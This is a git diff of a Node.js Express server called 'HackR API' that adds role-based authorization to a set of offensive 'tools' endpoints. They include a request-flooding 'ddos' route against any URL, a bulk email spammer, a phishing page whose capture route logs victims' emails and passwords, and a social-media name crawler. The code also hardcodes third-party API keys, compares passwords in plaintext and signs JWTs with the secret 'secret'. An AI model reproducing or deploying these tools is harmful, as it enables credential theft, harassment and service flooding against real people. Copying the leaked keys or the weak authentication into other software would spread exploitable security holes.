@@ -9,6 +9,7 @@ const port = 3000
 const { User, Role } = require('./models');
 const jwt = require('jsonwebtoken');
 const cors = require('cors');
+const authorize = require('./authorize');
 
 app.use(express.urlencoded({extended : true}))
 app.use(express.json())
@@ -19,7 +20,9 @@ app.get('/', (req, res) => {
     res.send('HackR API - Maël GUILLOTEAU');
 });
 
-app.get('/tools/email-check', authentication, async (req, res) => {
+// Functionnalities
+
+app.get('/tools/email-check', authentication, authorize('email-check'), async (req, res) => {
     const { email } = req.query; 
     if (!email) {
         return res.status(400).send('email requis');
@@ -38,153 +41,23 @@ app.get('/tools/email-check', authentication, async (req, res) => {
     }
 });
 
-app.get('/tools/password-check', authentication, async (req, res) => {
-    const { password } = req.query;
-    if (!password) {
-        return res.status(400).send('mot de passe requis');
-    }
-
-    try {
-        const response = await axios.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt');
-        const commonPasswords = response.data.split('\n');
-        const isCommon = commonPasswords.includes(password);
-
-        if (isCommon) {
-            res.send('the password is current.');
-        } else {
-            res.send('the password is not current.');
-        }
-    } catch (error) {
-        console.error('error retrieving password list :', error.message);
-        res.status(500).send('password verification error.');
-    }
-});
-
-app.get('/tools/generate-password', (req, res) => {
-    const { length } = req.query;
-    const passwordLength = length ? parseInt(length, 10) : 12;
-
-    if (isNaN(passwordLength) || passwordLength < 8) {
-        return res.status(400).send('Invalid password length. Minimum 8 characters.');
-    }
-
-    const generateComplexPassword = (length) => {
-        const lowerChars = 'abcdefghijklmnopqrstuvwxyz';
-        const upperChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-        const numbers = '0123456789';
-        const specialChars = '!@#$%^&*()_+~`|}{[]:;?><,./-=';
-        
-        const allChars = lowerChars + upperChars + numbers + specialChars;
-        let password = '';
-
-        password += lowerChars[Math.floor(Math.random() * lowerChars.length)];
-        password += upperChars[Math.floor(Math.random() * upperChars.length)];
-        password += numbers[Math.floor(Math.random() * numbers.length)];
-        password += specialChars[Math.floor(Math.random() * specialChars.length)];
-
-        for (let i = password.length; i < length; i++) {
-            password += allChars[Math.floor(Math.random() * allChars.length)];
-        }
-
-        return password.split('').sort(() => 0.5 - Math.random()).join('');
-    };
-
-    const securePassword = generateComplexPassword(passwordLength);
-    res.send(`Password: ${securePassword}`);
-});
-
-
-app.get('/tools/generate-identity', (req, res) => {
-    const identity = {
-        firstName: faker.person.firstName(),
-        lastName: faker.person.lastName(),
-        email: faker.internet.email(),
-        address: faker.location.streetAddress(),
-        city: faker.location.city(),
-        country: faker.location.country(),
-        phone: faker.phone.number(),
-    };
+app.post('/tools/spammer', authentication, authorize('spammer'), async (req, res) => {
+    const { email, subject, text, count } = req.body;
     
-    res.json(identity);
-});
-
-app.get('/tools/domain-info', authentication, async (req, res) => {
-    const { domain } = req.query;
-    if (!domain) {
-        return res.status(400).send('domain name required.');
+    if (!email || !subject || !text || !count) {
+        return res.status(400).send('All fields are required (email, subject, text, count)');
     }
 
     try {
-        const response = await axios.get(`https://api.securitytrails.com/v1/domain/${domain}/subdomains`, {
-            headers: {
-                'APIKEY': 'zXX3d0vUSreC-9KY2-SwAQULQCmkhDnv' 
-            }
-        });
-
-        res.json(response.data);
+        await sendSpamEmail(email, subject, text, parseInt(count));
+        res.status(200).send(`${count} emails successfully sent to ${email}`);
     } catch (error) {
-        console.error('error when retrieving sub-domains.', error.message);
-        res.status(500).send('error when retrieving sub-domains.');
+        console.error('Error when sending emails:', error);
+        res.status(500).send('Error when sending emails.');
     }
 });
 
-app.get('/tools/random-image', async (req, res) => {
-    try {
-      const imageResponse = await axios.get('https://thispersondoesnotexist.com', {
-        responseType: 'arraybuffer'
-      });
-  
-      res.set('Content-Type', 'image/jpeg');
-      res.send(imageResponse.data);
-    } catch (error) {
-      res.status(500).send('Error generating image');
-    }
-  });
-
-app.post('/tools/ddos', async (req, res) => {
-    const { targetUrl, numberOfRequests } = req.body;
-
-    if (!targetUrl || !numberOfRequests) {
-        return res.status(400).send('Target URL and number of requests required.');
-    }
-
-    const results = [];
-
-    for (let i = 0; i < numberOfRequests; i++) {
-        try {
-            await axios.get(targetUrl);
-            results.push(`Request ${i + 1} sent to ${targetUrl}`);
-        } catch (error) {
-            results.push(`Error with request ${i + 1}: ${error.message}`);
-        }
-    }
-
-    res.json({ message: 'Simulation complete.', results });
-});
-
-app.get('/tools/crawler', async (req, res) => {
-    const { name } = req.query;
-
-    if (!name) {
-        return res.status(400).send('Nom requis.');
-    }
-
-    try {
-        const response = await axios.get(`https://api.social-searcher.com/v2/search`, {
-            params: {
-                q: name,
-                api_key: 'f56047486e056256a67cafe1bcb6dc25',
-            },
-        });
-
-        res.json(response.data);
-    } catch (error) {
-        console.error('Error while retrieving information :', error.message);
-        res.status(500).send('Error retrieving information or maximum number of requests reached');
-    }
-});
-
-app.get('/tools/phishing', (req, res) => {
+app.get('/tools/phishing', authentication, authorize('phishing'), (req, res) => {
     const html = `
     <!DOCTYPE html>
     <html lang="en">
@@ -230,7 +103,7 @@ app.get('/tools/phishing', (req, res) => {
     res.send(html);
 });
 
-app.post('/tools/phishing/capture', (req, res) => {
+app.post('/tools/phishing/capture', authentication, authorize('phishing'), (req, res) => {
     const { email, password } = req.body;
     const data = `Email: ${email}, Password: ${password}\n`;
 
@@ -243,15 +116,159 @@ app.post('/tools/phishing/capture', (req, res) => {
     });
 });
 
+app.get('/tools/password-check', authentication, authorize('password-check'), async (req, res) => {
+    const { password } = req.query;
+    if (!password) {
+        return res.status(400).send('mot de passe requis');
+    }
 
+    try {
+        const response = await axios.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt');
+        const commonPasswords = response.data.split('\n');
+        const isCommon = commonPasswords.includes(password);
 
-// app.get('/protected-route', authentication, (req, res) => {
-//     if (req.user.role !== 'admin') {
-//         return res.status(403).json({ message: "Access forbidden" });
-//     }
-//     res.status(200).json({ message: "You have access to this route", user: req.user });
-// });
+        if (isCommon) {
+            res.send('the password is current.');
+        } else {
+            res.send('the password is not current.');
+        }
+    } catch (error) {
+        console.error('error retrieving password list :', error.message);
+        res.status(500).send('password verification error.');
+    }
+});
 
+app.get('/tools/domain-info', authentication, authorize('domain-info'), async (req, res) => {
+    const { domain } = req.query;
+    if (!domain) {
+        return res.status(400).send('domain name required.');
+    }
+
+    try {
+        const response = await axios.get(`https://api.securitytrails.com/v1/domain/${domain}/subdomains`, {
+            headers: {
+                'APIKEY': 'zXX3d0vUSreC-9KY2-SwAQULQCmkhDnv' 
+            }
+        });
+
+        res.json(response.data);
+    } catch (error) {
+        console.error('error when retrieving sub-domains.', error.message);
+        res.status(500).send('error when retrieving sub-domains.');
+    }
+});
+
+app.post('/tools/ddos', authentication, authorize('ddos'), async (req, res) => {
+    const { targetUrl, numberOfRequests } = req.body;
+
+    if (!targetUrl || !numberOfRequests) {
+        return res.status(400).send('Target URL and number of requests required.');
+    }
+
+    const results = [];
+
+    for (let i = 0; i < numberOfRequests; i++) {
+        try {
+            await axios.get(targetUrl);
+            results.push(`Request ${i + 1} sent to ${targetUrl}`);
+        } catch (error) {
+            results.push(`Error with request ${i + 1}: ${error.message}`);
+        }
+    }
+
+    res.json({ message: 'Simulation complete.', results });
+});
+
+app.get('/tools/random-image', authentication, authorize('random_image'), async (req, res) => {
+    try {
+      const imageResponse = await axios.get('https://thispersondoesnotexist.com', {
+        responseType: 'arraybuffer'
+      });
+  
+      res.set('Content-Type', 'image/jpeg');
+      res.send(imageResponse.data);
+    } catch (error) {
+      res.status(500).send('Error generating image');
+    }
+});
+
+app.get('/tools/generate-identity', authentication, authorize('generate-identity'), (req, res) => {
+    const identity = {
+        firstName: faker.person.firstName(),
+        lastName: faker.person.lastName(),
+        email: faker.internet.email(),
+        address: faker.location.streetAddress(),
+        city: faker.location.city(),
+        country: faker.location.country(),
+        phone: faker.phone.number(),
+    };
+    
+    res.json(identity);
+});
+
+app.get('/tools/crawler', authentication, authorize('crawler'), async (req, res) => {
+    const { name } = req.query;
+
+    if (!name) {
+        return res.status(400).send('Nom requis.');
+    }
+
+    try {
+        const response = await axios.get(`https://api.social-searcher.com/v2/search`, {
+            params: {
+                q: name,
+                api_key: 'f56047486e056256a67cafe1bcb6dc25',
+            },
+        });
+
+        res.json(response.data);
+    } catch (error) {
+        console.error('Error while retrieving information :', error.message);
+        res.status(500).send('Error retrieving information or maximum number of requests reached');
+    }
+});
+
+app.get('/tools/generate-password', authentication, authorize('generate-password'), (req, res) => {
+    const { length } = req.query;
+    const passwordLength = length ? parseInt(length, 10) : 12;
+
+    if (isNaN(passwordLength) || passwordLength < 8) {
+        return res.status(400).send('Invalid password length. Minimum 8 characters.');
+    }
+
+    const generateComplexPassword = (length) => {
+        const lowerChars = 'abcdefghijklmnopqrstuvwxyz';
+        const upperChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const numbers = '0123456789';
+        const specialChars = '!@#$%^&*()_+~`|}{[]:;?><,./-=';
+        
+        const allChars = lowerChars + upperChars + numbers + specialChars;
+        let password = '';
+
+        password += lowerChars[Math.floor(Math.random() * lowerChars.length)];
+        password += upperChars[Math.floor(Math.random() * upperChars.length)];
+        password += numbers[Math.floor(Math.random() * numbers.length)];
+        password += specialChars[Math.floor(Math.random() * specialChars.length)];
+
+        for (let i = password.length; i < length; i++) {
+            password += allChars[Math.floor(Math.random() * allChars.length)];
+        }
+
+        return password.split('').sort(() => 0.5 - Math.random()).join('');
+    };
+
+    const securePassword = generateComplexPassword(passwordLength);
+    res.send(`Password: ${securePassword}`);
+});
+
+app.get('/protected-route', authentication, (req, res) => {
+    if (req.user.role !== 'admin') {
+        return res.status(403).json({ message: "Access forbidden" });
+    }
+    res.status(200).json({ message: "You have access to this route", user: req.user });
+});
+
+// Register / Login / Logout
 
 app.post('/register', async (req, res, next) => {
     try {
@@ -269,7 +286,6 @@ app.post('/register', async (req, res, next) => {
     }
 });
 
-
 app.post('/login', async (req, res, next) => {
     try {
         let { email, password } = req.body;
@@ -286,9 +302,11 @@ app.post('/login', async (req, res, next) => {
         let valid = password === user.password;
         if (!valid) throw { name: "Invalid email/password" };
 
-        // let access_token = jwt.sign({ id: user.id, role: user.Role.name }, "secret");
-        // res.status(200).json({ access_token });
-        res.status(200).json("you are logged in");
+        let access_token = jwt.sign({ id: user.id, role: user.Role.name }, "secret");
+        res.status(200).json({
+            message: "you are logged in",
+            access_token: access_token
+        });
     } catch (error) {
         next(error);
     }
@@ -301,21 +319,7 @@ app.post('/logout', authentication, (req, res) => {
     res.status(200).json({ message: "Successful disconnection." });
 });
 
-app.post('/tools/spammer', async (req, res) => {
-    const { email, subject, text, count } = req.body;
-    
-    if (!email || !subject || !text || !count) {
-        return res.status(400).send('All fields are required (email, subject, text, count)');
-    }
 
-    try {
-        await sendSpamEmail(email, subject, text, parseInt(count));
-        res.status(200).send(`${count} emails successfully sent to ${email}`);
-    } catch (error) {
-        console.error('Error when sending emails:', error);
-        res.status(500).send('Error when sending emails.');
-    }
-});
 
 
 app.listen(port, () => {
@@ -380,7 +384,8 @@ async function authentication(req, res, next) {
 
         req.user = {
             id: user.id,
-            role: user.Role.name // Ajouter le rôle à la requête
+            roleId: user.roleId,
+            role: user.Role.name
         };
         next();
     } catch (error) {
